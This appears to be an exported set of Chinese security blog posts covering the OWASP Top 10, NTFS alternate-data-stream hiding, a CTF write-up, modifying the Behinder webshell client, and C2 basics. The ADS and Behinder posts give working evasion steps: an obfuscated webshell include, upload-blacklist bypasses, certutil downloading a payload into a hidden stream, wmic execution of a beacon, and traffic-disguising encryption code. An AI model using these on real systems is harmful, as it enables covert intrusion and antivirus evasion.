[{"title":"2021 OWASP TOP 10","url":"/2025/08/05/2021%20OWASP%20TOP%2010/","content":"近些年漏洞的威胁分类也发生了很大变化，王道SQL注入也慢慢淡出历史的舞台，最新OWASP Top Ten | OWASP Foundation版，分类和排名都变化了很多\n\n[TOP1]失效的访问控制访问控制失效指的是：系统没有正确限制用户访问资源或功能，导致用户可以访问本不该访问的内容或操作\n具体的例子：用户越权访问\n用户 A 修改自己的资料：\n\nPOST /api/user/update?id=1001\n\n\n他把 ID 改成了管理员的 ID：\n\nPOST /api/user/update?id=1\n\n\n没有权限校验？那就直接修改管理员信息成功了\n\n水平越权普通用户访问了其他用户的数据，比如：\nGET /api/orders/123456\n\n→ 返回了别人的订单信息（严重泄露）\n垂直越权普通用户调用了管理员接口：\nPOST /api/admin/delete_user?id=2\n\n如果没检查角色权限，就能直接删号\n前端控制误信前端隐藏了按钮，认为“用户就点不到”：\n&lt;!-- 管理员按钮 --&gt;&lt;button style=&quot;display: none&quot;&gt;删除用户&lt;/button&gt;\n\n然而攻击者直接 F12 改代码，照样能点\n[TOP2]加密机制失效它其实是以前叫做“敏感数据暴露（Sensitive Data Exposure）”的进化版，专门指：加密没做好 or 该加密却没加密，导致敏感信息暴露\n什么叫“加密机制失效”？就是本来你用了加密，结果：\n\n用错算法了\n密钥管理乱套了\n加密流程瞎写\n本该加密的地方压根没加密\n\n结果攻击者轻轻松松就拿到敏感数据：密码、银行卡、身份信息、Token、session、甚至数据库内容……\n常见的失效方式：\n\n\n错误类型\n示例\n\n\n\n使用弱加密算法\n使用 MD5&#x2F;SHA1 加密密码\n\n\n明文传输敏感信息\n登录时通过 HTTP 提交用户名密码\n\n\n明文存储敏感数据\n数据库里直接存储身份证、手机号等\n\n\n加密后泄露密钥\n把密钥写在代码里、GitHub里\n\n\n没有加密\n比如 Cookie 没有设置 Secure + HttpOnly\n\n\n错误的加密流程\n密文没有加随机盐、IV 被复用等\n\n\n攻击者怎么利用\n截获未加密的 HTTP 请求，拿到账号密码。\n拿到数据库后用字典暴力破解 MD5 加密的密码。\n从前端源码或 Git 泄漏中拿到 AES 密钥解密所有数据。\n复用泄漏的 JWT Token 冒充他人身份\n\n[TOP3]注入最经典的一集\n什么是注入漏洞（Injection）？就是应用程序把用户输入当成代码或命令执行了，攻击者通过构造恶意输入，控制程序行为，从而实现：\n\n执行任意命令\n查询&#x2F;篡改&#x2F;删除数据库\n提权、越权\n甚至远程控制服务器\n\n常见的注入类型\n\n\n类型\n简介\n\n\n\nSQL 注入\n向数据库查询语句中注入恶意 SQL 代码\n\n\n命令注入\n向系统命令中注入恶意命令\n\n\nLDAP 注入\n向 LDAP 查询语句中注入内容\n\n\nXPATH 注入\n攻击 XML 查询逻辑\n\n\nNoSQL 注入\n攻击 MongoDB、Redis 等非关系型数据库\n\n\n表达式注入\n如 SpEL、OGNL 等框架表达式被执行\n\n\nORM 注入\n即使用了 ORM 框架，但拼接查询也能被注入\n\n\n[TOP4]不安全的设计不安全的设计指的是：在系统架构、业务流程、功能逻辑上，一开始就没有考虑安全，导致再怎么加补丁也“补不住”。  \n 它和“实现缺陷”不同，强调的是设计阶段的安全问题，而不是代码实现时的小失误\n举个栗子：例1：没有验证码\n登录接口无限试错 → 被爆破了\n注册接口被批量打脚本 → 被刷号了\n\n例2：密码重置只用邮箱地址就能触发\n没有身份验证 → 轻松盗号\n\n例3：未做权限分离的业务逻辑\n所有人都能访问 /admin/delete_user?id=1\n\n例4：可预测的文件上传路径\n上传文件保存为 /upload/&#123;用户名&#125;.jpg\n恶意访问 /upload/admin.jpg 直接泄露敏感资源\n\n[TOP5]安全配置错误什么是“安全配置错误”？安全配置错误是指：系统、框架、服务器、数据库等组件的默认配置太危险，或者运维部署过程中配置疏忽、遗漏，导致被攻击者利用的情况。\n一不小心就把“后门”留给了黑客\n常见的配置错误示例：\n\n\n类型\n示例\n\n\n\n默认密码未修改\nadmin&#x2F;admin、root&#x2F;root、123456\n\n\n目录&#x2F;文件暴露\n.git/、/backup.zip、/WEB-INF/可访问\n\n\n错误信息泄露\n报错页面暴露堆栈、路径、数据库结构等\n\n\n开启调试模式\nFlask 的 debug=True，Spring Boot 的 actuator\n\n\n开放未使用端口\nRedis、Elasticsearch、MongoDB 未授权访问\n\n\n跨域配置不当\nCORS 允许任意来源：Access-Control-Allow-Origin: *\n\n\n缺少 HTTP 安全头\n没设置 X-Content-Type-Options, X-Frame-Options 等\n\n\nTLS 配置弱\n使用 SSL3.0、弱密码套件、没有证书校验\n\n\n容器或云服务配置问题\nDocker 映射敏感目录、云 bucket 设置成公开可读写\n\n\n[TOP6]自带缺陷和过时的组件什么是“自带缺陷和过时的组件”？指的是：你的项目中依赖了有已知漏洞的软件组件、库、框架、服务，但你却没有及时更新、替换或做防护，攻击者一看版本就知道怎么打。\n也叫：\n\n第三方组件漏洞\n供应链安全问题的一种\n\n常见的“有毒”组件例子：\n\n\n类型\n漏洞例子\n危害\n\n\n\nWeb框架\nStruts2（S2-045）\n远程命令执行\n\n\nJS库\njQuery &lt;1.9\nXSS 漏洞\n\n\nJava依赖\nlog4j（Log4Shell）\n任意代码执行\n\n\nPython包\nrequests 老版本\nSSL验证绕过\n\n\nNode库\nlodash、express 老版本\n多种原型链污染\n\n\nCMS系统\nWordPress 插件漏洞\n任意文件上传、SQL注入\n\n\n只要我们获得了某个组件的版本，就可以用https://www.exploit-db.com/去查找对应的 exp\n当然有时 exp 会不奏效，我们可以根据实际情况对 exp 进行修改\n[TOP7]身份识别和身份验证错误什么是“身份识别与身份验证错误”？指的是系统在识别用户身份或验证用户合法性的机制上设计不当、实现出错，导致攻击者可以伪装他人、绕过登录、劫持账号、撞库成功等\n具体表现有哪些？\n\n\n类别\n示例\n危害\n\n\n\n弱密码策略\n可以设置 123456 或 admin\n被撞库&#x2F;穷举轻松成功\n\n\n无登录限制\n登录接口无限尝试密码\n爆破成功，账户被盗\n\n\n验证码缺失&#x2F;可绕过\n验证码固定、简单或能跳过\n自动化暴力攻击\n\n\nSession管理不当\nToken 泄露、过期机制缺失\n会话固定、劫持\n\n\n身份验证信息明文传输\nHTTP 明文传用户名&#x2F;密码\n被中间人攻击窃取\n\n\n多因子认证缺失\n仅靠密码验证\n易被撞库或钓鱼攻击\n\n\n身份切换不安全\n登录后修改参数切换为他人身份\n水平越权或账号接管\n\n\n[TOP8]软件和数据完整性故障什么是“软件和数据完整性故障”？指的是：系统在运行过程中依赖的软件、配置、代码或数据，没有进行完整性校验或校验机制被绕过，攻击者就可以篡改这些内容，进而控制系统。\n简而言之：你信任的东西被“偷偷动手脚”了，但你没检查\n常见攻击场景\n\n\n类型\n示例\n后果\n\n\n\n供应链投毒\n**开发依赖了被挂马的 NPM 包（如 ****event-stream**）\n项目编译就中毒，攻击者远控系统\n\n\n自动更新缺乏签名验证\n软件启动时更新 **.exe** 没做签名校验\nMITM 劫持替换为木马\n\n\nCI&#x2F;CD 脚本可被注入\n发布脚本中引用外部 Bash&#x2F;Python 脚本\n远程代码执行、上传后门\n\n\n缺少完整性校验\n静态文件未设置 Hash，容易被篡改\n攻击者插入恶意 JS&#x2F;XSS\n\n\nDocker 镜像来源不明\n使用了不可信的第三方镜像\n镜像自带恶意服务或后门账号\n\n\n[TOP9]安全日志和监控故障什么是“安全日志和监控故障 ”？安全日志和监控故障是指系统未能妥善记录安全相关事件，或者在发生攻击或异常时未能及时检测与响应，导致攻击行为未被发现或延迟应对，从而扩大损害范围。\n常见表现\n系统关键操作没有记录日志，如登录、权限变更、敏感数据访问。\n日志记录过于简单或不一致，缺乏时间戳、用户标识、IP 信息等。\n日志没有集中存储或无法追踪。\n未部署 SIEM（安全信息与事件管理）系统或告警规则缺失。\n日志被攻击者删除或篡改后无恢复机制。\n发生攻击时无自动响应机制（如封锁 IP、断开连接等）。\n\n实际危害\n攻击滞后发现：例如 Webshell 被植入服务器几个月都未被察觉。\n取证困难：无法还原攻击路径，影响溯源与司法调查。\n监管不合规：如金融、医疗等行业必须满足日志留存合规要求。\n扩大损害：攻击者反复尝试暴力破解或横向移动而不被发现。\n\n[TOP10]服务器端请求伪造(SSRF)什么是“服务器端请求伪造(SSRF) ”？SSRF 是指攻击者诱使 服务器端发起请求，目标通常是：\n\n内网服务（如 http://127.0.0.1:2375）\n云服务元数据接口（如 AWS 的 http://169.254.169.254/latest/meta-data/）\n其他本不应被访问的地址\n\n攻击原理：攻击者控制请求地址，让服务器代为访问：\nPOST /fetch?url=http://169.254.169.254/latest/meta-data/iam/\n\n服务端拿这个 URL 去请求，就泄露了内部数据。\n检测方法（实战技巧）：\n使用 burp 修改参数试探内网 IP，如：\n\nurl=http://127.0.0.1:80/url=http://localhost:2375/url=http://169.254.169.254/\n\n\n利用 DNSlog 验证是否存在请求发出\n用 Gopher 协议构造 Redis 注入等高级 SSRF\n\n延伸场景（云原生）：\nSSRF 是打穿云平台、K8S 集群、获取云凭证的第一步\n可与 RCE、反序列化、身份提升等漏洞组合使用，形成 链式攻击\n\n**— **\nOWASP Top 10 总结了当今最常见且最严重的 Web 安全风险，涵盖了访问控制失效、加密机制薄弱、注入攻击、设计缺陷、配置错误、使用过时组件、身份验证问题、完整性缺失、日志监控不足以及服务器端请求伪造等各个层面。了解这些风险的原理、成因和防护方式，有助于开发者、运维人员与安全工程师在系统设计与实现过程中构建更加健壮、可信赖的应用程序。安全不是一次性的操作，而是一个持续演进的过程。只有将安全理念融入整个软件生命周期，才能真正有效降低攻击面，提升整体防护水平。  \n","tags":["web安全"]},{"title":"ADS数据流实现隐藏文件","url":"/2025/07/24/ADS%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/","content":"ADS：Alternate DataStreams，全称 NTFS 交换数据流，是 NTFS 磁盘格式的一个特性，在 NTFS 文件系统下，每个文件都可以存在多个数据流。简单来说，就是其他文件可以寄宿在某个文件身上。利用 ADS 数据流可以做很多有趣的事情\n在NTFS分区创建ADS数据流文件有两种形式：\n\n一是指定宿主文件；\n二是创建单独的ADS文件。\n\n创建的指令有两个：echo 和 type\n\necho 用于常规字符\ntype 用于将文件附加到某个文件\n\n使用方法1. 使用宿主文件echo test &gt; 1.txt:flag.txt\n正常用 dir 是无法查看到的，可以使用 dir &#x2F;r\nC:\\test&gt;dir 驱动器 C 中的卷没有标签。 卷的序列号是 46BD-3363 C:\\test 的目录2025/07/22  03:53    &lt;DIR&gt;          .2025/07/22  03:53    &lt;DIR&gt;          ..2025/07/22  03:53                 0 1.txt               1 个文件              0 字节               2 个目录 45,771,202,560 可用字节C:\\test&gt;dir /r 驱动器 C 中的卷没有标签。 卷的序列号是 46BD-3363 C:\\test 的目录2025/07/22  03:53    &lt;DIR&gt;          .2025/07/22  03:53    &lt;DIR&gt;          ..2025/07/22  03:53                 0 1.txt                                  9 1.txt:flag.txt:$DATA               1 个文件              0 字节               2 个目录 45,771,161,600 可用字节\n文件内容可以使用命令\nnotepad 1.txt:flag.txt\n此类文件可以通过直接删除宿主文件清除。\n2. 单独的 ADS 数据流文件这类可以通过以下命令来创建：\necho hide &gt; :mo.txt\n创建后该目录内是没有文件的，并且用当前目录下的命令行也无法查看，因为它是依赖于文件夹的ADS数据流文件\n因此需要退到上一级目录去查看\ncd ../notepad test\n\nwebshell后门由于 Windows 系统对 ADS 文件都没有执行权限，因此隐藏此类 webshell 需要用到文件包含来配合\n首先创建一个被包含文件：index.php:mo.txt\n在里面藏一个 phpinfo\necho ^&lt;?php phpinfo();?^&gt; &gt; index.php:mo.txt\n\n为了避免被查，给文件名进行 hex 编码，最后创建一个实现文件包含功能的 include.php \n&lt;?php$a=&quot;696E6465782E7068&quot;.&quot;703A6D6F2E747874&quot;;$b=&quot;a&quot;;include(PACK(&#x27;H*&#x27;,$$b))?&gt;\n\n文件上传当然这里也可以借助此数据流实现 Bypass 上传黑名单限制\n当我们上传数据流文件时，形如 test.php::$DATA 、test.php:a.txt 这样的后缀， windows 系统就会需要创建一个对应的宿主文件 test.php ，同时假设我们需要上传的文件内容为：\n&lt;?php phpinfo();?&gt;\n\n根据上传文件名不同，会产生不同效果\ntest.php:a.jpg\n效果：生成 test.php，文件内容为空\ntest.php::$DATA\n效果：生成 test.php, 文件内容为 &lt;?php phpinfo();?&gt;\ntest.php::$INDEX_ALLOCATION\n效果：生成 test.php 文件夹\ntest.php::$DATA\\0.jpg\n效果：生成 0.jpg，文件内容为 &lt;?php phpinfo();?&gt;\n上传文件名为 Test.php::$INDEX_ALLOCATION 时会生成对应的文件夹，那么以理论上来说是可以用于突破 UDF 提权时无法创建文件夹的问题，但是我测试的时候并不可以，不知道是为什么，严重怀疑被参考文献骗了┭┮﹏┭┮\n病毒免杀windows的数据流文件都被禁止了执行权限，因此可以使用 wscript 来运行 vbs，在C盘的根目录使用命令：\ntype 1.vbs &gt; :2.vbs\n可以创建 C 盘存在的数据流文件 c::2.vbs，没有工具是无法清除的，而且也可以绕过部分安全厂商的查杀\n这个 vbs 文件也是可以运行的\nwscript c::2.vbs\ndll 文件同理：\ntype test.dll &gt; 1.txt:msregsvr32 1.txt:ms\n\n清除方式：用winhex或者删除宿主文件或者借助相关工具如 IceSword 也可进行删除。\n实战通过文件上传执行在 C:\\WINDOWS\\debug\\WIA 的目录下（这个目录常被用于 Dropper（下发payload）或免杀执行）\n上传文件到 ADS 数据流\n$upload /tmp/beacon.exe \\\\.\\c:\\WINDOWS\\debug\\WIA\\test:aa.exe\n\n执行\n$wmic process call create \\\\.\\c:\\WINDOWS\\debug\\WIA\\test:aa.exe$execute -cH -f &quot;\\\\\\\\.\\\\c:\\\\WINDOWS\\\\debug\\\\WIA\\\\test:aa.exe&quot; (也可以使用msf来执行)\n\n通过文件下载执行利用 certutil 从 HTTP 下载一个文件并直接写入目标 ADS\n$certutil -urlcache -split -f http://url/test.exe \\\\.\\c:\\WINDOWS\\debug\\WIA\\test:aa.exe\n\n删除certutil缓存\n$certutil.exe -urlcache -split -f http://url/test.exe delete\n\n进一步隐藏如果想要 dir&#x2F;s 里看不到 ADS，可以使用特殊的文件名称：\n\\\\.\\C:\\test\\COM1\\\\.\\C:\\test\\COM2\\\\.\\C:\\test\\COM3-8\\\\.\\C:\\test\\COM9\\\\.\\C:\\test\\nul\n\n并且这些文件是不可以直接在UI界面删除的，要删除的话使用如下命令：\ndel \\\\.\\C:\\test\\nul\n\n","tags":["web安全"]},{"title":"2025年江苏省第七届大学生网络安全知识技能大赛-wp","url":"/2025/09/22/2025%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-wp/","content":"遗憾差一点点没进决赛， 还是少个二进制啊，可惜我们学校二进制断代了┭┮﹏┭┮\n比赛期间太仓促了，忘了截图，就这样纯文字吧签到密文：kaljviko8ohhh59;49:p单字符的xor，写个简单脚本计算：\ns = &quot;kaljviko8ohhh59;49:p&quot;print(&#x27;&#x27;.join(chr(ord(c)^13) for c in s))\nflag{dfb5beee846947}\nmisc1流量包内搜索 flag 的 base64 编码的前面部分 http contains &quot;Zmxh&quot;\n找到一段流量包，跟踪 http 流，里面有这么一段：\nZmxhZ3thNjVlMjdhZmMyYTdmN2UyN2ZmYjZkMjM5Mzk1ODU3Zn0iPmZsYWcudHh0O2VjaG8gY2E0OTg1ZjBmOGE5O3B3ZDtlY2hvIDJmOWUwNDJlM2Y2MQ%3D%3D\n解 base64 得到 flag\nflag{a65e27afc2a7f7e27ffb6d239395857f}\nweb1刚开始没看到附件，傻傻的测弱口令和注入测了半天浪费了时间，实际伪造 cookie：user&#x3D;admin，就可以越权\n访问 flag1：\nimport requestsurl = &quot;http://new.mhxaskills.cn:34050/flag1&quot;cookies = &#123;&quot;user&quot;: &quot;admin&quot;&#125;r = requests.get(url, cookies=cookies)flag1 = r.headers.get(&quot;Token&quot;)print(&quot;flag1:&quot;, flag1)\n\nflag2 这里访问 &#x2F;getflag2 路由可以用数组绕过异常访问 flag2：\nimport requestsurl = &quot;http://new.mhxaskills.cn:34050/getflag2&quot;payload = &#123;&quot;checkcode&quot;: &#123;&quot;length&quot;:16&#125;&#125;r = requests.post(url, json=payload)print(r.json())\n\n拼接起来得到 flagflag{451ea6d0-eb41-4094-dfa2-016bb104bb61}\nRSA直接用 ai 梭出脚本解出一段密文：\n5:11:AM:6:&#123;:0:9:5:2:4:4:5:1:5:7:8:6:1:2:3:2:1:9:1:5:8:2:AM:7:3:AM:1:3:4:0:2:2:&#125;\n把这段密文扔进随波逐流，发现是表盘 Clock Code 解码，解出 flag\nflag{0jfceefbfhigbcdcbjbficahdabde0cc}\ncrypto密文先解 base64 再解 hex，得到一大堆二进制数，删掉多余字符解 binary 再解 base64，最终得到 flag\nflag{fc4b10b03d910b6b0c745c6f74186e59}\n\nweb2 后来没时间解了就没做，misc2 修复高宽后就不会做了，二进制我花了最多时间但是一个都做不出，我是 fw ┭┮﹏┭┮\n","tags":["CTF"]},{"title":"BehinderV4魔改","url":"/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/","content":"“冰蝎”(Behinder)是一个动态二进制加密网站管理客户端，相比较于传统的老牌工具“菜刀”而言，对webshell的流量进行了相应的加密。”冰蝎”客户端基于JAVA，所以可以跨平台使用，随着版本的升级，兼容性也随之提升。主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等，功能非常强大，是现如今必不可少的渗透测试工具之一\n如今借助大模型，ai 对流量中木马特征的监测已经越来越准确，可冰蝎早已不再更新，木马上传上去之间就落地成盒，所以我们要对冰蝎马在原本的基础上进行改造\n冰蝎特征冰蝎有两个强特征，分别是\n\n和数据包一大堆加密\n如果这个数据包可以用冰蝎的传输协议解密，那就实锤为冰蝎马\n除此之外还有数个弱特征例如 connection：keep-alive ，固定的 ua 头等\n所以我们的魔改需要解决两个问题：\n\n绕过识别（魔改打乱指纹信息）\n绕过查杀（新增加密算法）\n\nJAP 反编译打包构建https://www.decompiler.com/\n在这个网站在线反编译，然后下载下来（也可以用 jd-gui 工具反编译）\n在 idea 中新建项目，选择 jdk8，然后将冰蝎的 jar 包导入模块中并设置主类为net.rebeyond.behinder.ui\n并且要将原冰蝎中的数据库文件复制到项目根目录下，不然会报错\n在修改时，只需将我们想要修改的文件在保留目录结构的情况下复制到 src 目录下再进行更改，注意不要复制整个目录过去，不然构建速度会很慢\n【冰蝎特征去除】 https://www.bilibili.com/video/BV1B8p8z9EWu/?share_source&#x3D;copy_web&amp;vd_source&#x3D;074bb30cb6ef186ca4cc14413973b1ae\n具体操作可以看上面这个视频，要注意现在 idea 不能直接下载 openjdk 1.8，所以要先自己下载下来\n防识别-打乱特征指纹在 Constants.java 中有标题信息，我们可以对其进行修改\npublic static String[] userAgents = new String[]&#123;&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&quot;, &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;&#125;;public static String[] accepts = new String[]&#123;&quot;application/json, text/javascript, */*; q=0.01&quot;, &quot;*/*1&quot;&#125;;public static String TIP_FOR_VERSION = &quot;\\u4fdd\\u7559\\u7248\\u6743\\u662f\\u5bf9\\u539f\\u521b\\u57fa\\u672c\\u7684\\u5c0a\\u91cd\\uff1a\\uff09&quot;;public static String VERSION = &quot; v4.1[ALe魔改版]&quot;;public static String AUTHOR = &quot;By ALe&quot;;\n\n同时还有 Accept 的两个强特征：\nAccept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\n\n还有剩下的其他字段如：\n\naccept 字段\nuser-agent 字段\nContent-type 字段\n\n都可以随便对其进行修改\n防查杀-新增加密协议参考加密方式：https://xz.aliyun.com/news/11899\n冰蝎 4 内置的六种传输协议早已被记载，单纯的两种加密嵌套在如今也很容易被解密，但是好在我们可以自定义传输的加密方式，如果你有实力甚至可以自创一种加密方法用于加密\n我们可以用冰蝎的传输协议进行测试，如果弹出“保存成功”就说明加密解密一致\n\n因为我还没学密码，所以就随便偷几个加密方式来\nkey-value格式+unicode加密加密：\nprivate byte[] Encrypt(byte[] data) throws Exception &#123; String content = &quot;id=1&amp;content=DaYer0&amp;token=1452178369&amp;status=00000&quot;; String result =java.util.Base64.getEncoder().encodeToString(data).replace(&quot;+&quot;, &quot;&lt;&quot;).replace(&quot;/&quot;,&quot;&gt;&quot;); String str = &quot;&quot;; StringBuffer unicode = new StringBuffer(); for (int i = 0; i &lt; result.length(); i++) &#123;   char c = result.charAt(i);   unicode.append(&quot;\\\\u00&quot; + Integer.toHexString(c)); &#125; content = content.replace(&quot;DaYer0&quot;, unicode.toString()); // ROT13 encryption StringBuilder encryptedContent = new StringBuilder(); for (int i = 0; i &lt; content.length(); i++) &#123;   char c = content.charAt(i);   if (c &gt;= &#x27;a&#x27; &amp;&amp; c &lt;= &#x27;z&#x27;) &#123;     c = (char) (((c - &#x27;a&#x27;) + 13) % 26 + &#x27;a&#x27;);   &#125; else if (c &gt;= &#x27;A&#x27; &amp;&amp; c &lt;= &#x27;Z&#x27;) &#123;     c = (char) (((c - &#x27;A&#x27;) + 13) % 26 + &#x27;A&#x27;);   &#125;   encryptedContent.append(c); &#125; return encryptedContent.toString().getBytes();&#125;\n\n解密：\nprivate byte[] Decrypt(byte[] data) throws Exception &#123; String content = new String(data); // Reverse ROT13 decryption StringBuilder decryptedContent = new StringBuilder(); for (int i = 0; i &lt; content.length(); i++) &#123;   char c = content.charAt(i);   if (c &gt;= &#x27;a&#x27; &amp;&amp; c &lt;= &#x27;z&#x27;) &#123;     c = (char) (((c - &#x27;a&#x27;) + 13) % 26 + &#x27;a&#x27;);   &#125; else if (c &gt;= &#x27;A&#x27; &amp;&amp; c &lt;= &#x27;Z&#x27;) &#123;     c = (char) (((c - &#x27;A&#x27;) + 13) % 26 + &#x27;A&#x27;);   &#125;   decryptedContent.append(c); &#125; String decodedString = decryptedContent.toString(); java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream(); bos.write(decodedString.getBytes(), 13, decodedString.length() - 43); String unicode = new String(bos.toByteArray()); StringBuilder sb = new StringBuilder(); int i = -1; int pos = 0; while ((i = unicode.indexOf(&quot;\\\\u&quot;, pos)) != -1) &#123;   sb.append(unicode.substring(pos, i));   if (i + 5 &lt; unicode.length()) &#123;     pos = i + 6;     sb.append((char) Integer.parseInt(unicode.substring(i + 2, i + 6),16));   &#125; &#125; byte[] decryptedData =java.util.Base64.getDecoder().decode(sb.toString().replace(&quot;&lt;&quot;, &quot;+&quot;).replace(&quot;&gt;&quot;,&quot;/&quot;)); return decryptedData;&#125;\n\nmultipart格式+hex加密加密：\nprivate byte[] Encrypt(byte[] data) throws Exception&#123;    String upload=&quot;-----------------------------7e6103b1815de Content-Disposition:form-data;name=\\&quot;uploadFile\\&quot;;filename=\\&quot;test.png\\&quot; Content-Type:application/octet-stream  DaYer0 -----------------------------7e6103b1815de--&quot;;    String str = &quot;&quot;;    String result = java.util.Base64.getEncoder().encodeToString(data).replace(&quot;+&quot;,&quot;&lt;&quot;).replace(&quot;/&quot;,&quot;&gt;&quot;);        for (int i=0;i&lt;result.length();i++)&#123;        int ch = (int)result.charAt(i);        String s4 = Integer.toHexString(ch);        str = str + s4;    &#125;    upload=upload.replace(&quot;DaYer0&quot;,str);    return upload.getBytes();&#125;\n\n解密：\nprivate byte[] Decrypt(byte[] data) throws Exception&#123;    java.io.ByteArrayOutputStream bos=new java.io.ByteArrayOutputStream();    bos.write(data,150,data.length-195);        String s= new String(bos.toByteArray());        byte[] baKeyword = new byte[s.length()/2];        for(int i = 0; i &lt; baKeyword.length; i++)&#123;        try&#123;            baKeyword[i] = (byte)(0xff &amp; Integer.parseInt(s.substring(i*2, i*2+2),16));        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;        &#125;        try&#123;        s = new String(baKeyword, &quot;utf-8&quot;);        &#125;catch (Exception e1)&#123;        e1.printStackTrace();        &#125;        return java.util.Base64.getDecoder().decode(s.replace(&quot;&lt;&quot;,&quot;+&quot;).replace(&quot;&gt;&quot;,&quot;/&quot;));&#125;\n\n过常规杀软问题不大，但是过不了人，百分百会被发现\n","tags":["web安全","免杀"]},{"title":"C2框架解析","url":"/2025/07/28/C2%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%90/","content":"C2 框架的发展历史摘自https://daffodi11.github.io/post/hong-dui-wu-qi-yan-fa-chang-shi-shi-xian-yi-ge-xian-dai-c2-kuang-jia-daffodilc2/\n最早且广为人知的C2(command&amp;control)框架可能是第一代的灰鸽子,采用客户端“主动连接”的方式,即客户端在主机A执行后，客户端监听，在服务端输入主机A的IP与端口后，才能进行通讯。  后来因为内网环境与防火墙的因素，发展出了“被动连接”方式的第二代C2框架，例如GHOST、大灰狼，与“主动连接”相反，即服务端监听，客户端主动连接服务端。此时出现了两种配置方式，一是FTP上线、二是域名解析上线。有效适应大多数网络环境,但易溯源、网络数据包易被提取特征、不易于现代红队协同使用。  为了解决这些问题，发展出了第三代C2框架例如cobalt strike,它支持HTTP、HTTPS、DNS等协议通讯,由TeamServer转发请求,隐秘性好、易于扩展、适合现代红队协同工作,如今被广泛使用。\n\n什么是 C2C2（Command and Control）是指在单个或一组目标受害者主机上建立和维持对植入工具的控制的过程。C2框架通常提供借助某个通信协议与植入工具进行通信的能力，向受害者系统发出命令，并且在C2服务器上接收这些命令的输出，使攻击者实现物理访问或直接的虚拟访问。\nC2 协议依赖于每个受控植入工具和 C2 服务器之间的同步或异步通信信道\n首先先介绍一些架构的基础知识\nC/S架构：Clinet/Server,主要指的是TCP，客户端和服务端，即便带个中转它也还是叫C/S架构B/S架构: Browser/Server,主要是HTTP，无论直接通过浏览器操作，还是像CS加个中转再用客户端访问RAT：Remote Admin Tools，远程管理工具，长期以来国内外通用叫法。C2: command&amp;control，从字面上就很好理解命令和控制，现在新叫法。不管任何协议，木马都可这样叫。\n\nCobalt Strike 采用的是 C&#x2F;S 架构，由 GUI 客户端连接远程的 TeamServer 实现控制。被控端（Beacon）以异步方式通过 HTTP&#x2F;HTTPS&#x2F;DNS 等协议回连 TeamServer，形成 implant 与 C2 的通信通道。  \n\n控制端 → TeamServer：专用协议（非 HTTP）  \nBeacon → TeamServer：HTTP&#x2F;HTTPS&#x2F;DNS 等协议\n\n从本质上来说，Metasploit 也是一个 C2 框架，是一个标准的 C&#x2F;S 架构，而 Meterpreter 是 Metasploit 的核心 implant。Meterpreter 是一个非常典型的 被控代理（agent），它默认是异步通信模型，通信协议支持：\n\nTCP（反弹）\nHTTP&#x2F;HTTPS（绕过代理和防火墙）\nStaged 和 Stageless 模式\n\nC2 的优势众所周知 C2 是用在后渗透上的，那么我们为什么要用 C2 框架进行后渗透呢？\n我们可以将 C2 的功能和 netcat 进行对比\n相比于普通的Netcat侦听器，C2框架可能具有更多的功能、灵活性和隐蔽性；C2框架可以针对shell提供更好的会话管理功能，能够让我们很方便地管理和操作多个远程shell\nC2 的基本结构C2 ServerC2服务器能够充当代理回调的中心，C2代理将定期和C2服务器联系并等待操作员的命令\nAgents &#x2F; PayloadsC2代理出现在目标系统感染之后，它运行在目标系统上，并且能够接受C2服务器的控制命令并执行，起代理作用。\n与标准的反向shell相比，C2代理在大多数情况下还能够支持一些特殊功能，大多数C2框架都实现了伪命令，这可以简化C2操作人员的工作\nbeacon的流量特征可通过Malleable-C2-Profiles定制，从而能在一定程度上规避安全性检测。\nListeners侦听器是运行在C2服务器上的一种应用程序，它将会等待通过特定端口或协议进行的回调操作，相关的协议可以是DNS、HTTP和HTTPS 等\nBeaconsBeacon(信标)是指 C2 代理回调在 C2 服务器上运行的侦听器的过程，它是一种恶意软件与 C2 服务器之间的定期通信方式(通信机制)\n当恶意软件感染目标系统，需要与控制服务器(C2服务器)建立连接，但是C2服务器不会持续发出命令，所以恶意软件就需要采取一定机制定期与C2服务器通信，并确认连接状态和获取新命令，这个过程可以通过 Beacon 进行\n Beacon通信的主要特征是: \n\n定期性：保持定期的通信间隔，比如每隔30秒到5分钟不等； \n短小报文：通常只传输少量信息，比如恶意软件ID、主机地址等； 